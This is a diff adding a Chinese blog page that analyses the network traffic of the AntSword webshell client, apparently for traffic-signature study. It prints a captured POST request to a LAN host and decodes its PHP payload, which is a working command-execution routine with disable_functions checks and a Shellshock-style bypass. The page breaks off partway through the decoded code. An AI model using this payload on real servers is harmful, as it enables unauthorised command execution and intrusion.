@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="exploit,tools," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="分析一下蚁剑的流量特点 AntSword虚拟终端 &#x2F; 命令执行在打开蚁剑的虚拟终端时，会执行 cd [path] 指令，  发出的包如下 123456789POST &#x2F;1.php HTTP&#x2F;1.1Host: 192.168.1.106:80Accept-Encoding: gzip, deflateUser-Agent: Mozilla&#x2F;5.0 (compatible">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蚁剑流量分析">
+<meta property="og:url" content="http://www.ethushiroha.com/AntSword.html">
+<meta property="og:site_name" content="stdout">
+<meta property="og:description" content="分析一下蚁剑的流量特点 AntSword虚拟终端 &#x2F; 命令执行在打开蚁剑的虚拟终端时，会执行 cd [path] 指令，  发出的包如下 123456789POST &#x2F;1.php HTTP&#x2F;1.1Host: 192.168.1.106:80Accept-Encoding: gzip, deflateUser-Agent: Mozilla&#x2F;5.0 (compatible">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623124844673.png">
+<meta property="og:image" content="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140254835.png">
+<meta property="og:image" content="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140641090.png">
+<meta property="article:published_time" content="2021-06-23T03:14:10.000Z">
+<meta property="article:modified_time" content="2021-06-23T06:30:20.220Z">
+<meta property="article:author" content="stdout">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="tools">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623124844673.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.ethushiroha.com/AntSword.html"/>
+
+
+
+
+
+  <title>蚁剑流量分析 | stdout</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">stdout</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-文章">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友链">
+          <a href="/py.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/AntSword.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://gitee.com/ethustdout/pics/raw/master/uPic/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="stdout">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">蚁剑流量分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-23T11:14:10+08:00">
+                2021-06-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tools/" itemprop="url" rel="index">
+                    <span itemprop="name">tools</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>分析一下蚁剑的流量特点</p>
+<h1 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h1><h2 id="虚拟终端-命令执行"><a href="#虚拟终端-命令执行" class="headerlink" title="虚拟终端 / 命令执行"></a>虚拟终端 / 命令执行</h2><p>在打开蚁剑的虚拟终端时，会执行 <code>cd [path]</code> 指令，</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623124844673.png" alt="image-20210623124844673"></p>
+<p>发出的包如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;1.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.106:80</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; chromeframe&#x2F;12.0.742.112)</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4099</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22f0b3%22.%22b67c6%22%3Becho%20%40asenc(%24output)%3Becho%20%22c91%22.%22583%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22v1f656c7c99039%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22x44aab141531de%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22u6af8538cd4c2e%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#39;trim&#39;%2Carray_map(&#39;strtolower&#39;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#39;putenv&#39;)%20%26%26%20(fe(&#39;error_log&#39;)%20%7C%7C%20fe(&#39;mail&#39;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#39;as&#39;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#39;error_log&#39;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#39;system&#39;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#39;passthru&#39;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#39;shell_exec&#39;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#39;exec&#39;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#39;popen&#39;))%7B%24fp%3D%40popen(%24c%2C&#39;r&#39;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#39;proc_open&#39;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;)%2C%202%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#39;antsystem&#39;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#39;WScript.shell&#39;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;u6af8538cd4c2e&#x3D;AN&amp;v1f656c7c99039&#x3D;gvL2Jpbi9zaA%3D%3D&amp;x44aab141531de&#x3D;T4Y2QgIi92YXIvd3d3L2h0bWwiO2NkIC92YXIvd3d3L2h0bWwvO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>返回包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Wed, 23 Jun 2021 05:30:13 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.46 (Debian)</span><br><span class="line">Content-Length: 37</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">f0b3b67c6[S]</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">[E]</span><br><span class="line">c91583</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将 <code>cmd</code> 的值进行 url 解码之后写入 phpstorm 中，可得到执行的 php 代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f0b3&quot;</span> . <span class="string">&quot;b67c6&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;c91&quot;</span> . <span class="string">&quot;583&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;v1f656c7c99039&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x44aab141531de&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;u6af8538cd4c2e&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span 